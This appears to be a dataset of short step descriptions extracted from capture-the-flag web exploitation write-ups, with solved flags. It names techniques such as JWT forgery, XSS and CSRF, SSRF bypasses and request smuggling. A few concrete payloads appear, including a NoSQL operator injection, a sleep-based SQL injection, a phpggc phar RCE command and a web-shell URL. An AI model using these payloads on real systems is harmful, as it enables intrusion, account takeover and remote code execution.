    "Note that the server will retrieve a value of 'undefined' for secret['randomstr'] and will not attempt to verify the JWT because the algorithm is 'none'",
    "Observe that this allows the server to pass the security checks and flag the token as true",
    "Inspect the webpage",
    "Understand the functionality",
    "Visit the `/cookies` endpoint",
    "Notice the particular cookie",
    "Use the script on the prepared website",
    "Read the window variable using JavaScript",
    "Find admin cookie",
    "Capture admin's cookie",
    "Submit the admin's cookie",
    "Get the flag",
    "Recognize that the page allows you to upload a custom HTML page.",
    "Recognize that you can report suspicious URLs to the admin.",
    "Identify that the <script>alert('pwned')</script> won't be executed.",
    "Identify that the reason for the script not being executed is the DOMValidator.js script.",
    "Realize that this JS file calculates some sort of document's hash.",
    "Realize that the JS file compares the calculated hash with the original hash.",
    "Note that the page wasn't setting any X-XSS-Protection header.",
    "Note that the XSS-Auditor in Chrome 74 is set to mode=filter.",
    "Note that mode=filter means any reflected XSS will be filtered and not executed.",
    "Append the xss=<script src=\"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/sha512.js\"> parameter to the query.",
    "Send the crafted URL, which includes the injected script, to the admin.",
    "Expect to receive the flag as a result of the successful injection.",
    "Explore the website interface.",
    "Recognize that the interface allows for creating redirect URLs, changing admin's password, and reporting URLs.",
    "Decide on the challenge to change the admin's password.",
    "Inspect the code in the /redirect.",
    "Understand that the potential XSS injection is blocked by the Content-Security-Policy header.",
    "Identify the anchor element that allows for a 'ping' attribute.",
    "Recognize the opportunity that 'ping' sends a POST request when the link is clicked.",
    "Think of exploiting this opportunity.",
    "Log in using the newly changed credentials of the admin account.",
    "Interpreted a template string",
    "Used Python's format function",
    "Used request.args as the argument",
    "Determined that the string {args} returns ImmutableMultiDict([])",
    "Ran the server locally",
    "Found the chain of properties",
    "Used the found object",
    "Accessed the 'app.secret_key' value",
    "In the 'Flask.current_app' module",
    "Retrieved the flag: actf{traversed_the_world_and_the_seven_seas}",
    "Executed the Python script",
    "Solved the challenge",
    "Using the command: python3 -m flask run",
    "Request 'nonces' from 'https://naas.2019.chall.actf.co/nonceify'",
    "Use Python-random-module-cracker tool",
    "Create a paste",
    "Expect that one of the nonces will work",
    "Admin visits the page",
    "Obtain the admin's cookie",
    "Use the admin's cookie to retrieve the flag",
    "Identify that the task is similar to the previous one.",
    "Recognize that blind NoSQL injection is required.",
    "Understand that the goal is to fetch all of the password's characters.",
    "Begin using the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"a\"}}",
    "Observe that the payload returns 'true'.",
    "Observe that the payload returns 'false'.",
    "Perform a bruteforce attack.",
    "Use the retrieved password to get the flag: actf{still_no_sql_in_the_sequel}.",
    "Open curl in terminal or command line.",
    "Compose a JSON body with 'username': 'admin'.",
    "Include the composed JSON body in the POST request.",
    "Include the manipulated cookie in the request's header.",
    "Check the response of the POST request for a session cookie.",
    "Identify and store the authenticated session cookie for 'admin' from the response.",
    "Use the browser or curl to navigate to the site's main page.",
    "Inspect the contents of the accessed page.",
    "Inspect the provided instance of the website.",
    "Study the functions of the website including 'flag store', create new store, update created store description, and create items in created store.",
    "Take note of suspect templates in the webpage's code, such as an 'update store description' template.",
    "Assess the function of the 'handlebars' library within the system.",
    "Continue the investigation by exploring the scope of the Template Injection vulnerability.",
    "Identify a token structure.",
    "Identify how the 'id' in the token is created.",
    "Understand how the token is signed using 'store.key'.",
    "Analyze the structure of the store object.",
    "Recall if there are any properties that are not defined initially but used later.",
    "Locate where 'store.key' is defined using 'crypto.randomBytes'.",
    "Identify when this function is called.",
    "Devise a strategy involving acquiring the secret key from the store object.",
    "Plan to sign a 'jwt' with a controlled object to purchase a 'flag' for $1.",
    "Recognize the security checks in place.",
    "Try to access or replace 'store.key' through the Template Injection vulnerability.",
    "Consider redefining the Object prototype if it's necessary.",
    "Find a way around the lack of access to the constructor property.",
    "Consider using older object manipulation features like '__defineSetter__' and '__defineGetter__'.",
    "Apply the determined attack vector to exploit the system.",
    "Redefine 'key' through '__defineSetter__' and '__defineGetter__'.",
    "Ensure the injection payload has been executed.",
    "Create a token with the overridden '[object Object]' as the secret key.",
    "Automate the process through script.",
    "Complete the CTF.",
    "Access the support page on the website",
    "In the 'Support' section, users can send two types of messages to the admin: 'Problems with Profile' and 'Get premium account'",
    "Go to the 'Edit profile' section",
    "Edit the user's name",
    "Manually changed the 'Link to profile' field to 'http://ourwebsite' in the first option of 'Support' section",
    "Made the admin visit it",
    "Observed the HTTP response header, it indicated various constraints including inability to include external scripts and styles, embedding the site in iframe on an external site",
    "Found out the parameter 'uuid' in the request 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=<uuid>' is vulnerable to injections ( XSS/CSS ) and is limited to '36 characters'",
    "Discovered 'manage.php' page with dirbuster",
    "Both 'profile.php' and 'manage.php' are protected by a 'hidden token'",
    "these tokens are associated with the current session",
    "Attempt to send 'POST' data to the 'profile.php' or 'manage.php'",
    "Attempted to change status to 'premium'",
    "Received 'Permission Denied!' message",
    "Decided to use CSRF (Cross-Origin Request Forgery) attack to change the status to 'premium', the only missing piece is the 'token'",
    "'name' is a short form of 'window.name' property",
    "Sent the admin to the page with the payload",
    "The flag was found in the profile: 'ctfzone{0190af5705a38115cd6dee6e7d79e317}'",
    "Access the website",
    "Access the 'Support' section",
    "Access the 'Edit profile' section",
    "Edit the user's own name",
    "Manually modify the 'Link to profile' field",
    "Select the first option in the 'Support' section",
    "Make the admin visit the modified 'Link to profile'",
    "Observe the HTTP response header",
    "Note the various constraints mentioned in the header",
    "Identify the parameter 'uuid' in the request URL",
    "Note the limitation of '36 characters' for the 'uuid' parameter",
    "Discover the 'manage.php' page",
    "Determine the purpose of the 'manage.php' page: changing 'user status' to 'premium'",
    "Identify the 'hidden token' protection",
    "Note that the tokens are associated with the current session",
    "Attempt to send 'POST' data to 'profile.php' with a different 'Referrer'",
    "Attempt to send 'POST' data to 'manage.php' with a different 'Referrer'",
    "Observe the 'Wrong Referrer' error",
    "Attempt to change status to 'premium'",
    "Observe the 'Permission Denied!' message",
    "Decide to use CSRF attack",
    "Set the goal of changing the status to 'premium'",
    "Note that the only missing piece is the 'token'",
    "Create the payload",
    "Send the admin to the webpage",
    "Send the admin to the page with the payload",
    "Find the flag in the profile: 'ctfzone{0190af5705a38115cd6dee6e7d79e317}'",
    "Identify the provided file is a packet capture (.pcap) file.",
    "Use Wireshark to read the packet capture file.",
    "Search for HTTP packets within the packet logs.",
    "Locate the POST requests to '/login.php'.",
    "Detect that the JavaScript file 'bundle.js' is used to calculate the hash value.",
    "Identify the existence of a WebSocket tunnel from the 'HTTP/1.1 101 Switching Protocols' packet.",
    "Analyze the JavaScript bundle to understand how the hash is calculated.",
    "Observe that the password is not given directly but might be related to the hash.",
    "Inspect the injected JavaScript code that is responsible for WebSocket communication.",
    "Understand that the client-server communication uses an encoding function.",
    "Note that client's 'User-Agent' value is used in the encoding function.",
    "Validate the encoding function by checking if it produces the same encoded message as captured in unmasked WebSocket packets in Wireshark.",
    "Determine that 'key2' is a shuffled version of 'key'.",
    "Identify that an attacker has set up a keylogger.",
    "Separate WebSocket packets into ones that are related to sent messages (particularly user input).",
    "Dump the related WebSocket packets for further analysis (decoding).",
    "Start the decoding process by reversing the function: encoded_arr.split('').map( x => key.indexOf(x) ).reverse().",
    "Continue the decoding process by solving for 'c' in the equation: c = seed, c0 = c + prev_encoded_arr[0] * 256, encoded_arr[0] == c0 % 58.",
    "Note that only 'encoded_arr[0]' is known, and 'seed' is the actual character of 'msg' that we are trying to find.",
    "Use brute force to solve for a set of possible solutions for 'c' and 'prev_encoded_arr[0]'.",
    "Narrow down the solutions by progressing through succeeding elements of 'prev_encoded_arr[]'.",
    "Implement a recursive function to retrieve one character from 'msg' for each WebSocket packet.",
    "Repeat the process for characters in each WebSocket packet.",
    "Remove unwanted characters from the decoded message.",
    "Extract the final flag.",
    "Downloaded the src.zip file",
    "Acquired the file from the provided link",
    "Extracted the contents of the zip file",
    "Found the bundle.js file",
    "Found the index.html file",
    "Identified the task as finding the correct password",
    "Located an input field on the provided webpage",
    "Recognized the obfuscation of the JavaScript code",
    "Monitored the execution flow of function calls",
    "Noted the sequence of function calls",
    "Identified a string within the JavaScript scope",
    "Recognized the string as representing the flag",
    "Confirmed the successful acquisition of the flag",
    "Note the UUID prefix '9e5a' mentioned in the challenge description.",
    "Download the provided 'src.zip' file from the challenge description.",
    "Download the provided 'flag.png.encrypted' file from the challenge description.",
    "Unzip 'src.zip'.",
    "Inspect the unzipped contents of 'src.zip'.",
    "Focus on the 'decrypt.php' file.",
    "Further inspect the contents of 'functions.php' file.",
    "Identify a function that validates the input of a UUID in 'functions.php'.",
    "Understand the correct UUID format and the known prefix.",
    "Include a statement to match the initial UUID sequence.",
    "Restructure the query to generate a SQL query that operates as 'SELECT id LIKE '9e5a%'.",
    "Perform the SQL injection using the constructed input string.",
    "Decrypt the 'flag.png.encrypted' file.",
    "Retrieve the flag from the decrypted image.",
    "Analyze the web application/database setup's behavior.",
    "Develop an SQL payload that determines the length of the intended data ('flag').",
    "Analyze the results from the SQL payload tests.",
    "Observe that the new representation of the flag is a 152-digit long number.",
    "Pass a range of data values to test the properties of the number casting in the database.",
    "Determine that integer values exceeding '9223372036854775807' will be converted into floating numbers.",
    "Attempt to concatenate large integers in SQLite.",
    "Find that SQLite treats large integers the same way it treats strings during concatenation.",
    "Identify all instances of the 152-digit number.",
    "Assemble the migrated instances of the 152-digit number.",
    "Identify the final flag from the assembled digits.",
    "Notice that the JavaScript code checks if the outcome equals 1337 to give the flag",
    "Note that the code must contain only lowercase letters, parentheses, and periods",
    "Use the factorization of 1337 (7*191) to create the first payload",
    "Reduce the number of characters in the payload by improving upon the first solution",
    "Use a new approach that does not involve factorization to achieve a payload with an even smaller character size",
    "Improve the payload further by using different JavaScript functions to reduce the character count",
    "The code gives flag upon meeting the condition",
    "Visit the website.",
    "Assess the functionality of the web page.",
    "Check the site's 'Bug Bounty' form.",
    "Submit suspicious URLs to be visited by a headless Chrome agent.",
    "Gain admin access.",
    "Create a CSRF page.",
    "Use <meta name='referrer' content='no-referrer'>.",
    "Construct a post form.",
    "Manage to access the admin's note.",
    "Face a password prompt.",
    "Notice that clicking on 'Facebook', 'Google' or 'Twitter' buttons attaches the note id and password to the shared URL.",
    "Try to implement a similar mechanism to the CSRF mechanism used earlier.",
    "Grab the password.",
    "Attempt to log in the admin to a dummy Twitter account.",
    "Notice an undeleted Tweet.",
    "Authenticate on behalf of the admin without success.",
    "Try to generate 'oauth tokens' for the flag note.",
    "Share the generated URL with the admin.",
    "Find out it is achievable by making two additional GET requests.",
    "Intercept 'oauth tokens' by stopping the request from 'twitter' to 'yeunote'.",
    "Use burp tool to execute the interception.",
    "Accessed URL http://138.68.228.12/?is_debug=1.",
    "Gain full control of the $whoareyou variable.",
    "Realized necessity to create raw HTTP requests.",
    "Created the GET request: 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1 Host: 138.68.228.12 Connection: close'.",
    "Identified manipulating capabilities of Apache2.",
    "Used format of '..://alien.somewhere.meepwn.team/../..//index.php' request.",
    "Managed to bypass the 'strpos(urldecode($remote),'..')' condition.",
    "Managed to bypass the 'parse_url($remote, PHP_URL_HOST)' condition.",
    "Managed to control $whoareyou variable.",
    "Passed through conditions checking for specific value comparisons.",
    "Used a bash script to extract the PHPSESSID with auth set.",
    "Received form on alien_sector.php.",
    "Abused the type attribute.",
    "Bypassed message length restriction.",
    "Ran the shell script by visiting the URL 'http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep MeePwn /var/www/'.",
    "Received the flag: MeePwnCTF{__133-221-333-123-111___}.",
    "Found alternative solution posted by P4Team.",
    "Identify that the request was double proxied with Apache.",
    "Identify that the request was double proxied with Nginx.",
    "Discover that Apache2 is restrictive towards parsing the HTTP request.",
    "Find information on Angular's secondary segments in paths.",
    "Investigate Angular's source code.",
    "Discover a 'primary' segment in Angular.",
    "Use the primary segment to create a URL.",
    "Create a URL that would circumvent the '/debug*' restriction.",
    "Visit the manipulated URL.",
    "Retrieve the flag.",
    "Found a way to bypass the Angular application.",
    "The Angular application was set up behind an Nginx reverse proxy.",
    "Successfully accessed the '/debug/answer' endpoint.",
    "Found an alternative method to solve the challenge for the second flag.",
    "Verified that Angular parses the URL created from 'PROTOCOL + HOST + PATH'.",
    "Identified the challenge.",
    "Determined the system only responded with the flag if the request came from the loopback network.",
    "Noted the situation that even though the app was hidden behind Nginx reverse proxy.",
    "Identified that the application didn't trust 'X-Forwarded-*' headers.",
    "Accessed '/q' endpoint.",
    "Identified 'this.service.getAnswer()' command in the Angular application.",
    "Understood it led to 'this.http.get('/api/answer')'.",
    "Discovered Angular uses a Host header - 'PROTOCOL + HOST + / PATH' while performing HTTP requests.",
    "Noticed Angular also follows redirects.",
    "Formulated a strategy to provide a custom host.",
    "Executed the curl command 'curl 'http://universe.chal.ctf.westerns.tokyo/a' -H 'Host: terjanq.me'.",
    "Successfully obtained the flag {you-have-to-eat-tomato-yume-chan!} as a result of the bypass.",
    "Identified the application was protected by DOMPurify in version 2.0.16.",
    "Learned of an existing bypass in Chrome for the version of DOMPurify the application was using.",
    "Abused strange behaviors of `<math>` elements.",
    "Used the provided bypass.",
    "Identified a mutation with the `<table>` element.",
    "Utilized the earlier-found mutation to leak cookies to the server.",
    "Realized the previous solution may not have been intended.",
    "Decided to look for another way to solve the challenge.",
    "Realized the application was simulating a Brainf*ck decompiler.",
    "Discovered `<` and `>` characters were protected using a `replaceAll` function.",
    "Understood that the `writeOutput` function could potentially be invoked while the program was still running.",
    "Realized this could lead to unreplaced `<` and `>` characters.",
    "Recognized that the condition for this to occur was the function not being called.",
    "Used DOM Clobbering to bypass the `CONFIG.unsafeRender` check.",
    "Injected two `reCAPTCHA` buttons.",
    "Crafted a final payload that exploits the bypass.",
    "Rewrote the document to `/terjanq/` using the crafted payload.",
    "Identify the goal of this CTF problem is to bypass WAF protection.",
    "Identify the goal of this CTF problem is to access local resources.",
    "Study the provided Python script.",
    "Note the condition within the 'admin_status' function.",
    "Identify that the condition only returns the flag if the request is coming from a '127.0.0.1' IP address.",
    "Recognize that the 'valid_ip' function restricts usage of certain IP addresses.",
    "Identify the IP addresses that are restricted.",
    "Identify that the restrictions include the localhost (127.0.0.1).",
    "Identify the possibility of representing the localhost (127.0.0.1) in a different notation.",
    "Identify the restrictions set in the 'valid_ip' function.",
    "Identify that representing the localhost (127.0.0.1) in a different notation can bypass the restrictions.",
    "Use the octal notation of 127.0.0.1 IP address.",
    "Identify the octal notation of 127.0.0.1 IP address is 0177.0.0.1.",
    "Make a HTTP request.",
    "Specify the target URL as 'http://0177.0.0.1/admin-status'.",
    "Observe the returned flag.",
    "Understand the provided code.",
    "Observe the code structure.",
    "Attempt to bypass the double-check using the modified DNS entry.",
    "Repeat the attempts until the flag is obtained.",
    "Consider setting up a personal DNS server for a more reliable solution.",
    "Consider using a tool like singularity to set up a DNS server.",
    "Use the DEMO application provided by singularity.",
    "Replace the RANDOM placeholder in the URL with something random.",
    "Identify that input sanitization is only implemented on the front end via JavaScript.",
    "Decide to use burpsuite to bypass the front-end input sanitization.",
    "Configure the burpsuite tool.",
    "Start the burpsuite tool.",
    "Read the hint for this challenge",
    "Conduct research on the CVE related to this challenge",
    "Identify the Laravel version used in the challenge",
    "Search for 'ip/_ignition/execute-solution' in the Laravel panel",
    "Access the found Laravel panel",
    "Perform a post request in the Laravel panel",
    "Receive a 302 response",
    "Create a phar file",
    "Use the custom command from 'phpggc' repo",
    "Insert the phar file into the exploit",
    "Run the exploit",
    "Execute the command 'php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system \"cat /flagM1AhS\"'",
    "Read the obtained flag",
    "Found a part of the flag: CHTB{",
    "Found another part of the flag: us3full_1nf0rm4tion}",
    "Look into static/css/main.css.",
    "Found a potential hint: c4n_r3ve4l_",
    "Find the file js.main.",
    "Found the last piece of the flag: 1nsp3ction_",
    "Combine all the collected flag parts.",
    "Form the complete flag: CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}",
    "Identify a hint in the website.",
    "Identify that developers may have used blacklisting to prevent path traversal.",
    "Recognize the replacement of certain string patterns as a blacklisting mechanism.",
    "Infer that payload modification is necessary to bypass security measures.",
    "Execute the first successful exploit.",
    "Plug in a modified payload with a long sequence of directory traversal in the URL.",
    "Find the flag by testing one more exploit.",
    "Use the modified payload in the exploit.",
    "Observe the result of the exploit leading to '/flag'.",
    "Access the login page.",
    "Access the source code of the web app.",
    "Analyze the 'entrypoint.sh' bash file.",
    "Aim to extract the password serving as the flag.",
    "Intercept the login request with 'Burpsuite'.",
    "Note the Json response upon attempted logins.",
    "Note the message displayed on the front end upon attempted logins.",
    "Attempt basic payloads for NoSQL injection.",
    "Observe unsuccessful results.",
    "Use RegEx payload.",
    "Confirm presence of characters in the password.",
    "Confirm that the flag begins with 'CHTB{'.",
    "Progressively brute-force characters.",
    "Check successful log-in messages to determine correct characters.",
    "Run the script.",
    "Obtain the complete flag.",
    "Analyze the given files.",
    "Identify it as a Python environment.",
    "Identify the usage of the Python Pillow library.",
    "Notice the usage of a vulnerable version of the Python Pillow library.",
    "Extract the understanding from the pull request.",
    "Locate the usage of 'eval' in util.py.",
    "Extract the understanding of the possibility to upload an image.",
    "Recognize that RGB parameters can be manipulated in the uploaded image.",
    "Conduct experiments with uploading images.",
    "Manipulate RGB values in the uploaded images.",
    "Successfully read the flag.txt file using the manipulated RGB value.",
    "Examined the application.",
    "Noted the process of converting markdown input to PDF file for download.",
    "Examined the 'package.json' file in the site source.",
    "Identified the dependencies 'md-to-pdf' and 'nunjucks' in the 'package.json' file.",
    "Conducted research on 'md-to-pdf'.",
    "Discovered a CVE for 'md-to-pdf'.",
    "Revisited the original payload.",
    "Identified the need to adjust the payload for 'nunjucks'.",
    "Adjusted line 1 and 3 of the payload to work with 'nunjucks'.",
    "Generated a payload for executing a command.",
    "Executed the payload to find the flag.",
    "Redirected the flag to a file in the invoices directory.",
    "Captured the flag with the payload.",
    "Arrived at the support page.",
    "Observed POST request capability.",
    "Observed login page.",
    "Decoded the JWT token.",
    "Discovered the API endpoint /api/users/update.",
    "Sent a request to update the password via XHR.",
    "Logged in with the new password.",
    "Attempted to escalate privileges by changing the 'uid' from 100 to 1 using the previous payload.",
    "Logged back in with escalated privileges.",
    "Visit the website.",
    "Check the docker configuration file.",
    "Look for additional information in the file.",
    "Determine that the website is a Flask application.",
    "Determine that the website is running on a MySQL database.",
    "Suspect possible SQL Injection.",
    "Discover the config.py file.",
    "Find database information within the file.",
    "Review the database.py file.",
    "Deduce that the database logic requires password token.",
    "Attempt to extract database details.",
    "Log in using extracted credentials.",
    "Successfully obtain the flag.",
    "Received the URL and Docker file for the challenge.",
    "Accessed the website.",
    "Observed the status report of the combat robot and a command prompt.",
    "Analyzed the Docker file.",
    "Clarified that the 'shell_exec' function executes a command in a shell and returns the output.",
    "Confirmed that the exploit worked.",
    "Used the exploit.",
    "Checked the login page source code.",
    "Checked the docker files.",
    "Realized application is running Flask with MySQL.",
    "Noticed similarity to previous Drobots challenge.",
    "Found database config info in config.py.",
    "Looked into database.py.",
    "Noticed password verification with passwordVerify.",
    "Saved the request.",
    "Logged in with the obtained credentials.",
    "Noticed a change in website functionality.",
    "Checked routes.py file.",
    "Identified application logic.",
    "Relocated flag name from 'flag.txt' to 'signal_sleuth_firmware' in root.",
    "Extracted the flag.",
    "Open the app's login page.",
    "Check the network tab.",
    "Go to a third-party website.",
    "Copy the introspection query.",
    "Paste the introspection query into BurpSuite.",
    "Send the introspection query to the graphql endpoint.",
    "Receive a full introspection response from the /graphql endpoint.",
    "Paste the introspection data received into the graphql voyager tool.",
    "Identify a 'Mutation' query in the graphql schema.",
    "The 'Mutation' query allows change of a user password.",
    "Use the 'UpdatePassword' mutation.",
    "Change the admin account's password.",
    "Log into the admin account.",
    "Use the new password.",
    "Discover the flag.",
    "Open the developer tools.",
    "Navigate to the network tab.",
    "Analyze the content of the script.js file.",
    "Identify the code that checks for a 4 digit pin.",
    "Observe the code fetching the flag based on the pin value.",
    "Switch to the console.",
    "Enter the correct pin.",
    "Press the enter key.",
    "Observe the returned flag.",
    "Examine the service.",
    "Identify that the service lists all the items in the mentioned directory.",
    "Search for the flag.",
    "Browse the 'user' directory.",
    "Find the 'flag.txt' file.",
    "Navigate to the '/home/user' directory.",
    "Discover the flag.",
    "Modify the server configuration settings",
    "Point the server to the testing server IP address or domain",
    "Enter the username 'admin'",
    "Enter the password 'admin'",
    "Submit the authorization request",
    "Construct the request for the flag",
    "Send the request to the server",
    "Visit the company website for the CTF challenge",
    "Observe URL Capture button on the website",
    "Observe Admin button on the website",
    "Find out that the URL capture service takes a screenshot",
    "Discover that the captured screenshot is of a submitted webpage URL",
    "Discover the existence of an admin login page",
    "Attempt to access localhost on the URL capture service",
    "Succeed in accessing localhost on the URL capture service",
    "Observe that the loading splash screen is identical to the challenge website",
    "Check the content of robots.txt",
    "Attempt to access /server-status",
    "Succeed in accessing /server-status",
    "Discover the login credentials in the logs",
    "Visit the login page.",
    "Observe that a status 500 is received.",
    "Enter an apostrophe in both the username and password fields.",
    "Confirm that no error occurs.",
    "Enter blank input enclosed in two apostrophes in the username field.",
    "Enter a single apostrophe in the password field.",
    "Observe the occurrence of an error.",
    "Determine that the error indicates the presence of an unclosed apostrophe.",
    "Enter blank input enclosed in two apostrophes in both the username and password fields.",
    "Confirm that no error occurs.",
    "Inject the payload ' or sleep(2) and 1=1#.",
    "Confirm the presence of blind SQL injection.",
    "Compare the syntax differences between the observed behavior and other database systems.",
    "Deduce that it is MySQL.",
    "Explain the syntax and usage of the SUBSTRING function.",
    "Explain the syntax and usage of the IF function.",
    "Create a Python script to automate the process.",
    "Check the cells",
    "Find a formula",
    "Identify a specific range 'A:B'",
    "Activate accessibility tools in the Tools section",
    "Unhide hidden sheets",
    "Using Accessibility Tool",
    "Call a range from the document",
    "Realize that a hidden sheet's full range can be accessed",
    "Type the hidden sheet's name",
    "Reveal the hidden sheet",
    "Hidden sheet gets added to the panes",
    "Find the flag",
    "Flag is inside the hidden sheet",
    "Enter username 'admin' and password 'admin' to login.",
    "Submit the login form.",
    "Click on the 'simple quiz' link or button to navigate to the quiz section.",
    "Search or browse through the quiz section to find the flag.",
    "Log in using the provided credentials.",
    "Observe the presence of a cookie named userData with userID and username.",
    "Analyze the server code files.",
    "Focus on app.js.",
    "Discover that the correct user id is required for admin access, not the password.",
    "Launch BurpSuite.",
    "Set the payload parameter at userID.",
    "Search for a checked checkbox for 'flag{'.",
    "Verify the flag on the website.",
    "Obtain the final flag: 'flag{y4m_y4m_c00k13s}'.",
    "Entered 'view-source:https://no-right-click.hsc.tf/useless-file.css' in the browser's address bar.",
    "Try various inputs.",
    "Include special characters in the inputs.",
    "Note the responses for each input.",
    "Open the server.py file.",
    "Brainstorm ideas.",
    "Apply logic to explore the use of commas as input.",
    "Submit a single comma as input.",
    "Increase the number of commas in the input to three.",
    "Consider the requirement for three keys and adjust the input accordingly.",
    "Receive the flag.",
    "Visited the website and viewed the login page",
    "Constructed a JSON body with username and password",
    "Sent the JSON body to the server",
    "Noticed that error messages are displayed in a javascript alert",
    "Inspected the page source and found no abnormalities",
    "Modified the JSON body by removing the 'name' key value pair",
    "Observed the resulting error message",
    "Analyzed the error message and deduced that a Python Flask backend is used",
    "Noted that exception messages are displayed in alert pop-ups",
    "Realized that the 'name' key value pair is required",
    "Attempted to remove the 'password' key from the JSON body",
    "Examined the 'if' condition that appears to determine the login logic",
    "Noticed that the SHA256 hash is calculated using the concatenation of 'password' and 'salt'",
    "Observed the comparison between the calculated hash and the 'hash' value",
    "Noticed that the 'salt' and 'hash' values are extracted from the JSON request body",
    "Realized that these values are used for the calculation and comparison",
    "Understood that it is possible to set custom values for 'salt' and 'hash'",
    "Developed a Python script to retrieve the flag",
    "Recognized that any values can be used for 'username', 'password', and 'salt' as long as the if condition is met",
    "Login into the system.",
    "Explore the public feed.",
    "Explore the profile settings.",
    "Explore the report link.",
    "Explore the create post button.",
    "Explore the search functionality.",
    "Explore the copy profile link feature.",
    "Explore the followers functionality.",
    "Discover that JavaScript is blocked.",
    "Try a bypass method by uploading HTML files disguised as image files.",
    "Discover that HTML files are uploaded successfully despite checks for images.",
    "Realize that HTML files don't execute on the server side.",
    "Understand that HTML files are downloaded with random filenames.",
    "Switch strategy and attempt to upload an HTML file containing a simple JavaScript function.",
    "Observe that JavaScript inside the uploaded HTML does execute.",
    "Realize that JavaScript doesn't execute when directly input into the application's fields.",
    "Encounter the HttpOnly problem.",
    "Review the challenge description again.",
    "Shift focus to the 'following' feature.",
    "Understand that the script would theoretically make any user follow the attacker account.",
    "Embed the crafted JS snippet into an HTML file.",
    "Upload the HTML file to the user profile.",
    "Get the uploaded HTML file link from the webpage.",
    "Confirm the success of the attack by checking for a new follow request from admin.",
    "Discover the admin's subdomain.",
    "Find a 'follow' button on the admin's profile.",
    "Attempt to follow admin.",
    "Receive a pending request response.",
    "Decide to use the same strategy to make admin accept the follow request.",
    "Understand that a POST request must be sent to '/profile/request' to make admin accept the follow request.",
    "Locate the JWT token within the session cookie.",
    "Decode the JWT token.",
    "Send the POST request to '/profile/request' with the 'id' of the attacker's user to gain admin's acceptance as a follower.",
    "Find the flag within a fan post after gaining admin's acceptance as a follower.",
    "Complete the challenge.",
    "Establish a connection to localhost:12380.",
    "Use Apache httpd 2.4.49 to handle the connection.",
    "Conduct research on vulnerabilities of Apache httpd 2.4.49.",
    "Execute the 'ls' command to list files in the current directory.",
    "Execute the 'cat' command to view the contents of a file.",
    "Utilize the curl command to navigate through subdirectories.",
    "Include the Base64 encoded data as part of the request payload.",
    "Perform this step to prevent unintended data loss or corruption.",
    "Receive the Base64 encoded png file on the local machine.",
    "Used the command: nikto -h http://172.17.15.117:443/",
    "Observed line in the scan result.",
    "Followed directory path indicated in the scan result.",
    "Inserted file name in the URL.",
    "URL: http://172.17.15.117:443/3e6f0e21-7faa-429f-8a1d-3f715a520da4.png",
    "Discovered the flag.",
    "Connect to target IP:33337.",
    "Observe redirection to domain name threeofhearts.ctf.net.",
    "Discover website hosting on Apache Traffic Server 7.1.1.",
    "Discover website hosting on Nginx server 1.15.5.",
    "Receive 400 error response for the first GET request.",
    "Receive internal web page response for th second GET request.",
    "Place a zero between the two GET requests.",
    "Intercept the request.",
    "Set the 'Host' header manually to threeofhearts.ctf.net.",
    "Discover PHP form for var1 and var2.",
    "Submit PHP form.",
    "Receive GET request to /save.php.",
    "Populate entry in /out/save.txt.",
    "Discover /private.php.",
    "Discover connection between successful HTTP request smuggling attack and second request with admin headers.",
    "Send request to /save.php.",
    "Include var1 and var2 parameters in the request.",
    "Include 'Transfer-Encoding: chunked' header in the request.",
    "Include 'Content-Length:53' header in the request.",
    "Fetch headers from /out/save.txt.",
    "Fetch PHP session ID from /out/save.txt.",
    "Access /private.php.",
    "Include fetched headers in the request.",
    "Arrive at page with the flag.",
    "Observe register and login pages.",
    "Navigate to registration page.",
    "Submit registration form.",
    "Include the parameter in the request.",
    "Verify admin privilege.",
    "Observe availability of admin button.",
    "Locate admin button on the webpage.",
    "Click the admin button.",
    "Observe flag retrieval.",
    "Performed the action of opening port 80.",
    "Performed the action of setting up socks correctly.",
    "Performed the action of accessing challenges.",
    "Performed the action of claiming the Free Flag.",
    "Identify the target port as port 11111",
    "Establish a connection to port 11111",
    "Recognize the presence of an SQL Injection vulnerability",
    "Encounter stability issues",
    "Successfully extract a password from the database",
    "Observe the extracted password is very long and alphanumeric",
    "Face an obstacle due to the password length exceeding the character limit of the login page",
    "Successfully retrieve a link",
    "Follow the retrieved link",
    "Discover an alternative approach to bypass authentication",
    "Identify the password field as the entry point for bypassing authentication",
    "Access the website.",
    "Notice the website information.",
    "Identify User Registration section.",
    "Identify User Login section.",
    "Identify Admin Login section.",
    "Proceed with user registration.",
    "Inspect the cookies.",
    "Locate the admin cookie.",
    "Locate the authenticated-user cookie.",
    "Locate the made-an-account cookie.",
    "Locate the visited-main-page cookie.",
    "Modify the value of the admin cookie.",
    "Send the modified request.",
    "Receive the flag.",
    "Observe a list of four different image galleries.",
    "Notice that one gallery is set to private.",
    "Realize that the private gallery cannot be unnecessarily accessed.",
    "Notice that the URL changes when querying any other galleries.",
    "Attempt to use the local-host address.",
    "Try to access the admin panel of the website.",
    "Successfully log into the admin panel.",
    "Find a box inside the admin panel.",
    "Access the newly public gallery.",
    "Started with port 20022",
    "Noticed that user cookie is double base64 encoded",
    "Double decoded the user cookie",
    "Found a PHP object in the decoded cookie.",
    "Identified attributes: 'username', 'admin', and 'profile_img'.",
    "Identified the task as a PHP Object Injection challenge",
    "Tried to become admin, but the server sent hints or funny responses",
    "Direct access to the flag was not successful.",
    "Manipulated the 'profile_img' attribute in the PHP object",
    "Final payload was a modified PHP object with the 'profile_img' attribute pointing to the flag",
    "Retrieve user and read permissions from the injected command.",
    "List the files using the backtick-enclosed 'ls' command.",
    "Identify the presence of 'index.php' file in the results.",
    "Execute the 'cat index.php' command.",
    "View the code of 'index.php' file.",
    "Execute the 'ls ../' command to check the parent directory.",
    "Identify the presence of 'flag.txt' file in the parent directory.",
    "Attempt to execute the 'cat ../flag.txt' command.",
    "Fail to execute the command due to exceeding the character limit.",
    "Utilize the un-blacklisted linux redirection character '<'.",
    "Used curl command",
    "Sent a GET request",
    "URL: http://challenge.nahamcon.com:31428/",
    "Used X-Forwarded-For header",
    "Set X-Forwarded-For header",
    "Value: 127.0.0.1",
    "Emulate local host client access",
    "Accessed the given website.",
    "The identification was based on the mention of XML.",
